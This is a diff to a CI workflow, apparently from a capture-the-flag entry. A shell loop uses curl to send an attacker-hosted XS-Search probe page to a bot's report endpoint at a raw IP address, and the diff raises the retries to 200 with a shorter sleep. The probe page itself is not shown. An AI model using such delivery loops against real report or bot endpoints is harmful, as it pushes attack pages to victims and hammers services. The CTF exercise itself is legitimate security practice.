@@ -12,12 +12,16 @@ jobs:
         shell: bash
         run: |
           url='https://htmlpreview.github.io/?https://raw.githubusercontent.com/MyeongJong03/xssearch-attack/ctf/impression-probe-20261121/probe2.html#run=1'
-          for attempt in {1..30}; do
+          for attempt in {1..200}; do
             status=$(curl --silent --show-error --max-time 10 --output response.txt --write-out '%{http_code}' --data-urlencode "url=$url" 'http://172.237.8.236:24457/report')
-            printf 'attempt=%d status=%s body=' "$attempt" "$status"
-            cat response.txt
-            printf '\n'
-            if [ "$status" = 202 ]; then exit 0; fi
-            sleep 10
+            if [ "$status" = 202 ]; then
+              printf 'accepted at attempt %d: ' "$attempt"
+              cat response.txt
+              exit 0
+            fi
+            if (( attempt % 20 == 0 )); then
+              printf 'attempt %d still busy (HTTP %s)\n' "$attempt" "$status"
+            fi
+            sleep 2
           done
           exit 1
